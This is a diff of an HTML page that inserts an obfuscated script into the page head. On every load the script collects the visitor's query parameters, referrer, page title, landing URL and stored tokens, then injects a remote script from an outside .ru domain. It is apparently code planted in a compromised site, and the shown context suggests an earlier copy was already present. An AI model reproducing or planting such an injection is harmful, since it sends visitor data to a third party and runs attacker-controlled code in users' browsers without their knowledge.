@@ -1,6 +1,49 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
+  <script>
+    (function() {
+    var name = '_WzCddBQY4KP3VKjq';
+    if (!window._WzCddBQY4KP3VKjq) {
+        window._WzCddBQY4KP3VKjq = {
+            unique: false,
+            ttl: 86400,
+            R_PATH: 'https://domengnasb-1.ru/bVHSDmK2',
+            P_PATH: 'https://domengnasb-1.ru/7b4f75c/postback',
+        };
+    }
+    const _X4j3Fg7GbJHKZ4DS = localStorage.getItem('config');
+    if (typeof _X4j3Fg7GbJHKZ4DS !== 'undefined' && _X4j3Fg7GbJHKZ4DS !== null) {
+        var _RcjSkcH1L146b3kb = JSON.parse(_X4j3Fg7GbJHKZ4DS);
+        var _MrKHDf6C3ZYZKT6J = Math.round(+new Date()/1000);
+        if (_RcjSkcH1L146b3kb.created_at + window._WzCddBQY4KP3VKjq.ttl < _MrKHDf6C3ZYZKT6J) {
+            localStorage.removeItem('subId');
+            localStorage.removeItem('token');
+            localStorage.removeItem('config');
+        }
+    }
+    var _SFfydftzCTnqm7nV = localStorage.getItem('subId');
+    var _4FCpzgKmDdmCTSkW = localStorage.getItem('token');
+    var _vwy2FRR9xWqqztgq = '?return=js.client';
+        _vwy2FRR9xWqqztgq += '&' + decodeURIComponent(window.location.search.replace('?', ''));
+        _vwy2FRR9xWqqztgq += '&se_referrer=' + encodeURIComponent(document.referrer);
+        _vwy2FRR9xWqqztgq += '&default_keyword=' + encodeURIComponent(document.title);
+        _vwy2FRR9xWqqztgq += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
+        _vwy2FRR9xWqqztgq += '&name=' + encodeURIComponent(name);
+        _vwy2FRR9xWqqztgq += '&host=' + encodeURIComponent(window._WzCddBQY4KP3VKjq.R_PATH);
+    if (typeof _SFfydftzCTnqm7nV !== 'undefined' && _SFfydftzCTnqm7nV && window._WzCddBQY4KP3VKjq.unique) {
+        _vwy2FRR9xWqqztgq += '&sub_id=' + encodeURIComponent(_SFfydftzCTnqm7nV);
+    }
+    if (typeof _4FCpzgKmDdmCTSkW !== 'undefined' && _4FCpzgKmDdmCTSkW && window._WzCddBQY4KP3VKjq.unique) {
+        _vwy2FRR9xWqqztgq += '&token=' + encodeURIComponent(_4FCpzgKmDdmCTSkW);
+    }
+    var a = document.createElement('script');
+        a.type = 'application/javascript';
+        a.src = window._WzCddBQY4KP3VKjq.R_PATH + _vwy2FRR9xWqqztgq;
+    var s = document.getElementsByTagName('script')[0];
+    s.parentNode.insertBefore(a, s)
+    })();
+    </script>
 	<script>
     (function() {
     var name = '_LWF4NrLXYn3LQ87x';
